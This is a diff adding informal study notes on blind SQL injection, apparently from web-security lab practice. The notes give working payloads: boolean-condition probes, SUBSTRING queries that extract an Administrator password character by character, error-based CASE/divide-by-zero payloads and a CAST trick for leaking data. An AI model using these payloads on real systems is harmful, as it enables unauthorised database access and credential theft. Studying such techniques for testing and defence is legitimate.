@@ -80,7 +80,38 @@ how to cause detectable diferences to find blind sqli
 1.cause a divide by zero
 2. cause a delay
 3.using burp collaborator
+ sqli can be caused by anything so fuxx everything likecookie any parametr anything that server accepts
 
+
+fist send a legal sql query to see difference then modify or invalid query  to see its affect
+eg ---> sometimes a successful query will give us specific http code or some text or a size of web page that will differ if wrong query is added
+this can help us to use conditional inputs to extract useful information
+
+first try with them=…xyz' AND '1'='1 , …xyz' AND '1'='2
+as first is true and second is false
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm    -----> first letter is greater than m
+
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's   --------> first letter is s
+---> you can use burp instruder to find it 
+this is jist exmple                  ----------> sometimes limit is also used
+
+
+
+
+10.error based blind sqli
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+use the methods and find response code or change in size 
+
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a ----> to find data
+
+
+
+11.how to convert one data type to another
+CAST((SELECT example_column FROM example_table) AS int) this can be useful when we have verbose output
+
+
+12 time delay
 
 
 
